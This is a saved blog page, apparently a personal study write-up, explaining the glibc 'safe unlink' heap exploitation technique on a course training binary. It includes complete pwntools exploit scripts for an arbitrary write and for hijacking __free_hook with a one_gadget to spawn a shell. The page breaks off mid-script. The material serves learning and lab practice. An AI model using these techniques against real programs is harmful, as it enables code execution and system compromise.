
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="http://localhost:1337/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="http://localhost:1337/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="http://localhost:1337/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Safe Unlink Technique The basic idea is the same as the unsafe unlink, i.e. leverage the unlinking process against itself to perform some mischievous actions. Anyway, there are two main factor to take into account: Being the NX enabled, it&#39;s not possible to execute shellcode stored into the heap …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Heap Journey - Safe Unlink"/>
  <meta property="og:description" content="Safe Unlink Technique The basic idea is the same as the unsafe unlink, i.e. leverage the unlinking process against itself to perform some mischievous actions. Anyway, there are two main factor to take into account: Being the NX enabled, it&#39;s not possible to execute shellcode stored into the heap …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="http://localhost:1337/binary-exploitation/heap-journey/safe-unlink.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2023-10-07 18:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
  <meta property="article:section" content="Binary Exploitation"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Heap Journey - Safe Unlink</title>


</head>
<body >

<aside>
  <div>
    <a href="http://localhost:1337/">
      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="http://localhost:1337/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="http://localhost:1337/">Home</a>

  <a href="/categories.html">Categories</a>
  <a href="/category/cheatsheet.html">Cheatsheets</a>
  <a href="/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="binary-exploitation/heap-journey/safe-unlink">Heap Journey - Safe Unlink</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#safe-unlink-technique" title="Safe Unlink Technique">Safe Unlink Technique</a></li><li><a class="toc-href" href="#safe-unlink-arbitrary-write" title="Safe Unlink: Arbitrary Write">Safe Unlink: Arbitrary Write</a></li><li><a class="toc-href" href="#safe-unlink-command-execution" title="Safe Unlink: Command Execution">Safe Unlink: Command Execution</a></li></ul></div>
        </div>
    <h2 id="safe-unlink-technique">Safe Unlink Technique</h2>
<p>The basic idea is the same as the unsafe unlink, i.e. leverage the unlinking process against itself to perform some mischievous actions. Anyway, there are two main factor to take into account:</p>
<ul>
<li>Being the NX enabled, it's not possible to execute shellcode stored into the heap or any other data region.</li>
<li>In recent GLIBC versions, the unlink macro has changed to a function called unlink_chunk(), doing the same job but with more checks.</li>
</ul>
<p>The unlink_chunk function is the <a href="https://github.com/bminor/glibc/blob/master/malloc/malloc.c#L1607">following</a>:</p>
<div class="highlight"><pre><span></span><code><span class="n">static</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">unlink_chunk</span><span class="w"> </span><span class="p">(</span><span class="n">mstate</span><span class="w"> </span><span class="n">av</span><span class="p">,</span><span class="w"> </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">chunksize</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">prev_size</span><span class="w"> </span><span class="p">(</span><span class="n">next_chunk</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="p">)))</span>
<span class="w">    </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">"corrupted size vs. prev_size"</span><span class="p">);</span>

<span class="w">  </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
<span class="w">  </span><span class="n">mchunkptr</span><span class="w"> </span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>

<span class="w">  </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">__builtin_expect</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span>
<span class="w">    </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">"corrupted double-linked list"</span><span class="p">);</span>

<span class="w">  </span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bk</span><span class="p">;</span>
<span class="w">  </span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">  </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span><span class="w"> </span><span class="p">(</span><span class="n">chunksize_nomask</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">p</span>
<span class="w">      </span><span class="o">||</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">p</span><span class="p">)</span>
<span class="w">    </span><span class="n">malloc_printerr</span><span class="w"> </span><span class="p">(</span><span class="s">"corrupted double-linked list (not small)"</span><span class="p">);</span>

<span class="w">      </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">p</span><span class="p">)</span>
<span class="w">        </span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">      </span><span class="n">else</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">          </span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
<span class="w">          </span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
<span class="w">          </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">          </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">      </span><span class="n">else</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">      </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
<span class="w">      </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>The first check ensures that the chunk being unlinked <strong>CHUNK_SIZE</strong> field is the same as the <strong>PREV_CHUNK_SIZE</strong> field of the next chunk.</p>
<p>The second check ensure that the chunk being unlinked is the chunk pointed by the <strong>fw_pointer</strong> of its previous chunk as well as the chunk being unlinked is the chunk pointed by the <strong>bk_pointer</strong> of its next chunk i.e., the chunk being unlinked actually belongs to the linked list. </p>
<ul>
<li>This check is known as the <strong><em>safe unlinking</em></strong> check.</li>
</ul>
<p>The third check is involved when the chunk being unlinked is part of a <em>Fast Bin</em>; it's similar to the second check. [TODO: SEE FASTBIN]</p>
<p>Bypassing the <strong>safe unlinking</strong> check requires the fw and bk pointers respectively of the previous and next chunk to point to the chunk being unlinked. Generally, only the top chunk address is stored into the arena instead of every chunks as part of malloc optimizations.
Anyway, when a chunk is allocated by a program (thread), it should be kept a reference to it to be used somewhere into the program. This would generally be stored into the stack, the data section, bss section or the heap itself.</p>
<ul>
<li>If the attacker can find the location where the address is stored, it can perform an attack similar to the unsafe unlink by using the found location as the fw_pointer as well as the bk_pointer when forging the fake free chunk (<a href="/binary-exploitation/heap-journey/unsafe-unlink.html">see Unsafe Unlink</a>)</li>
</ul>
<h2 id="safe-unlink-arbitrary-write">Safe Unlink: Arbitrary Write</h2>
<p>From Udemy course "Linux Heap Exploitation - Part 1", the binary safe_unlink is vulnerable to this heap exploitation technique.</p>
<p>The checksec tool is executed:</p>
<blockquote>
<p>&gt; checksec safe_unlink<br/>
&nbsp;&nbsp;&nbsp;&nbsp;Arch:     amd64-64-little<br/>
&nbsp;&nbsp;&nbsp;&nbsp;RELRO:    Full RELRO<br/>
&nbsp;&nbsp;&nbsp;&nbsp;Stack:    Canary found<br/>
&nbsp;&nbsp;&nbsp;&nbsp;NX:       <strong>NX enabled</strong><br/>
&nbsp;&nbsp;&nbsp;&nbsp;PIE:      No PIE (0x400000)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;RUNPATH:  b'../.glibc/glibc_2.30_no-tcache'  </p>
</blockquote>
<ul>
<li>The NX is enabled: it's not possible to execute code stored in the heap or stack</li>
</ul>
<p>Running the binary:</p>
<blockquote>
<p>&gt; =============== |   HeapLAB   |  Safe Unlink ===============<br/>
puts() @ 0x7ffff786faf0<br/>
<br/><br/>
1) malloc 0/2<br/>
2) edit<br/>
3) free<br/>
4) target<br/>
5) quit<br/>
&gt;</p>
</blockquote>
<ul>
<li>Only the puts() address is leaked: the attacker has to find himself if and where the chunks addresses are stored.</li>
</ul>
<blockquote>
<p>&gt; 1<br/>
size: 0x88
<br/><br/>
&gt; (gef) heap chunks 
Chunk(addr=<strong>0x603010</strong>, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  </p>
</blockquote>
<p>After allocating the first chunk of size 0x90:</p>
<blockquote>
<p>&gt; (gef) search-pattern 0x603010
[+] Searching '\x10\x30\x60' in memory<br/>
[+] In './safe_unlink'(0x602000-0x603000), permission=<strong>rw-</strong><br/>
&nbsp;&nbsp;<strong>0x602060</strong> - 0x60206c  &rarr;   "\x10\x30\x60[...]
<br/><br/>
&gt; (gef) x 0x602060<br/>
0x602060 &lt;m_array&gt;:     0x00603010</p>
</blockquote>
<p>It seems there's a m_array struct holding a pointer to the allocated chunk. More information are collected:</p>
<blockquote>
<p>&gt; (gef) ptype m_array
type = struct chunk {<br/>
&nbsp;&nbsp;&nbsp;&nbsp;char *user_data;<br/>
&nbsp;&nbsp;&nbsp;&nbsp;unsigned long request_size;<br/>
} <strong>[2]</strong>
<br/><br/>
x/4gx 0x602060<br/>
0x602060 &lt;m_array&gt;:     <strong>0x0000000000603010</strong>      0x0000000000000088<br/>
0x602070 &lt;m_array+16&gt;:  0x0000000000000000      0x0000000000000000</p>
</blockquote>
<p>The m_array is an array of allocated length equal to 2 (the program allows only two allocations), containing a user defined chunk struct which has two fields:</p>
<ul>
<li>char *user_data: pointer to a chunk</li>
<li>unsigned long request_size: size of the pointed chunk</li>
</ul>
<p>The first quadword is the first item user_data (chunk pointer) while the second quadword is the request_size (chunk size). The third and fourth quadword will contain the second chunk address and size the moment it gets allocated.</p>
<p>Since the m_array holds the chunk address and it's user controllable by the reflected write (it is into a memory area with rw- permissions), it can be used to pass the <strong>safe unlinking</strong> check. 
This is done by:</p>
<ul>
<li>using the chunk pointer stored in it as <strong>bk_pointer</strong> for a "fake" next chunk pointed by the <strong>fw_pointer</strong> of the forged fake free chunk (p-&gt;fw-&gt;bk)</li>
<li>using the chunk pointer stored in it as <strong>fw_pointer</strong> for a "fake" previous chunk pointed by the <strong>bk_pointer</strong> of the forged fake free chunk (p-&gt;bk-&gt;fw)</li>
</ul>
<p>so that when malloc checks that p-&gt;bk-&gt;fw == p &amp;&amp; p-&gt;fw-&gt;bk == p, the condition is satisfied.</p>
<p>Since the pointer is stored at the &amp;m_array address:</p>
<ul>
<li><strong>p-&gt;bk-&gt;fw = &amp;m_array</strong> implies that the (fake) chunk starts at &amp;m_array - 0x10, considering the chunk header (0x10)</li>
<li><strong>p-&gt;fw-&gt;bk = &amp;m_array</strong> implies that the (fake) chunk starts at &amp;m_array - 0x18, considering the chunk header (0x10) and the fw_pointer length (0x8)</li>
</ul>
<p><img alt='"Safe Unlink"' src="/images/binary-exploitation/heap-journey/safe-unlink/safe-unlink.png" title="Safe Unlink"/></p>
<p><code>fw_pointer_offset = 0x10</code></p>
<p><code>bk_pointer_offset = 0x18</code></p>
<p><code>fw_pointer = elf.sym.m_array - bk_pointer_offet</code></p>
<p><code>bk_pointer = elf.sym.m_array - fw_pointer_offset</code></p>
<p>The attack is similar to the one performed <a href="/binary-exploitation/heap-journey/unsafe-unlink.html">here</a>:</p>
<ul>
<li>The overflow for an A chunk is used to overwrite the PREV_CHUNK_SIZE field and PREV_INUSE flag of a B chunk, following A into the heap.</li>
<li>Then, the malloc is tricked into perform a consolidation when freeing the B chunk triggering the unlink process which will perform a reflected write.</li>
<li>This time, the forged free chunk will not be A itself, instead, it will be contained into A user data area.</li>
</ul>
<p><code>fake_chunk_header= p64(0) + p64(0x80)</code></p>
<p><code>chunk_A_data = fake_chunk_header + p64(fw_pointer) + p64(bk_pointer)</code></p>
<p><code>chunk_A_junk = b"\x00" * (0x88 - len(chunk_A_data) - 0x8)</code></p>
<p><code>fake_prev_size_field = p64(0x80)</code></p>
<p><code>fake_prev_inuse_flag = p64(0x90)</code></p>
<p>When setting chunk A data, not only the fw and bk pointers are be be set but also a fake header for the fake chunk being forged. Moreover, the header must have a CHUNK_SIZE field coherent with the PREV_CHUNK_SIZE of the next chunk to pass the first check performed by the unlink_chunk() function.</p>
<p><code>edit(b"0", chunk_A_data + chunk_A_junk + fake_prev_size_field + fake_prev_inuse_flag)</code></p>
<p>At this point, an unlink has taken place and the first quadword of m_array will point to &amp;m_array - 0x18.</p>
<p>Requesting an edit for index 0 (first item of m_array) will make the program write to &amp;m_array - 0x18; the target address is wrote a this point:</p>
<p><code>edit(b"0", b"\x00" * bk_pointer_offset + p64(elf.sym.target))</code></p>
<p>Requesting another edit for index 0 makes the program write to &amp;target:</p>
<p><code>edit(b"0", b"PWNED!\x00")</code></p>
<p>After this edit, the target is overwrote and the arbitrary write is completed:</p>
<blockquote>
<p>&gt; 4<br/>
target: PWNED!</p>
</blockquote>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./safe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.30_no-tcache/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./safe_unlink"</span><span class="p">)</span>
<span class="c1">#p = process("./safe_unlink")</span>

<span class="c1"># Use leaked libc puts() address and its offset to determine libc base address</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">puts_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_leaked_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>

<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size: "</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index: "</span><span class="p">,</span> <span class="n">idx</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:"</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Allocating Chunks"</span><span class="p">)</span>
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x88</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
<span class="n">malloc</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="mh">0x88</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>


<span class="nb">print</span><span class="p">(</span><span class="s2">"Forge fake freed chunk"</span><span class="p">)</span>
<span class="n">header_size</span> <span class="o">=</span> <span class="mh">0x10</span>
<span class="n">pointer_size</span> <span class="o">=</span> <span class="mh">0x8</span>

<span class="n">fw_pointer_offset</span> <span class="o">=</span> <span class="mh">0x10</span> 
<span class="n">bk_pointer_offset</span> <span class="o">=</span> <span class="mh">0x18</span>

<span class="n">fw_pointer</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="n">bk_pointer_offset</span> <span class="c1"># bk_pointer_offset is needed to make the address stored in the m_array be overlapped to the position where the malloc expects the bk_pointer to be present when evaluating fw-&gt;bk</span>
<span class="n">bk_pointer</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="n">fw_pointer_offset</span> <span class="c1"># fw_pointer_offset is needed to make the address stored in the m_array be overlapped to the position where malloc expects the fw_pointer to be present when evaluating bk-&gt;fw</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Forward Pointer : 0x</span><span class="si">{</span><span class="n">fw_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Backward Pointer : 0x</span><span class="si">{</span><span class="n">bk_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">fake_chunk_header</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">chunk_A_data</span> <span class="o">=</span> <span class="n">fake_chunk_header</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fw_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk_pointer</span><span class="p">)</span>
<span class="n">chunk_A_junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x88</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk_A_data</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> 

<span class="n">fake_prev_size_field</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
<span class="n">fake_prev_inuse_flag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Overlow to chunk B header"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="n">chunk_A_data</span> <span class="o">+</span> <span class="n">chunk_A_junk</span> <span class="o">+</span> <span class="n">fake_prev_size_field</span> <span class="o">+</span> <span class="n">fake_prev_inuse_flag</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Force chunk A consolidation by freeing B"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"First overwrite the m_array user_data pointer with the target address"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="n">bk_pointer_offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">target</span><span class="p">))</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Then overwrite the target content"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"PWNED!</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="safe-unlink-command-execution">Safe Unlink: Command Execution</h2>
<p>Having the ability to perform an arbitrary write and the leaked libc address, it's possible to achieve a command execution using a <strong>one gadget</strong> targeting the __free_hook (<a href="/binary-exploitation/heap-journey/fastbin-dup.html">"see fastbin dup"</a>).</p>
<p>After the unlink process, the first edit will write the __free_hook address into the user_data of the first m_array element.</p>
<p><code>edit(b"0", b"\x00" * bk_pointer_offset + p64(libc.sym.__free_hook))</code></p>
<p>Then, it's the <strong>one gadget</strong> turn:</p>
<p><code>gadget_offset = 0xe1fa1 # Found with one_gadget tool</code></p>
<p><code>gadget = libc.address + gadget_offset</code></p>
<p><code>edit(b"0", p64(gadget))</code></p>
<p>Now the __free_hook is weaponized: when the free function is called, the gadget will be executed dropping a shell*:</p>
<blockquote>
<p>&gt; 3<br/>
index: 0<br/>
<br/><br/>
&gt; id<br/>
uid=1000(jack) gid=1000(jack) gruppi=1000(jack)  </p>
</blockquote>
<ul>
<li>*Note: the one gadget prerequisites are satisfied; otherwise, additional steps or a different gadget would have been required.</li>
</ul>
<p>The complete pwntools solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./safe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.30_no-tcache/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./safe_unlink"</span><span class="p">)</span>
<span class="c1">#p = process("./safe_unlink")</span>

<span class="c1"># Use leaked libc puts() address and its offset to determine libc base address</span>
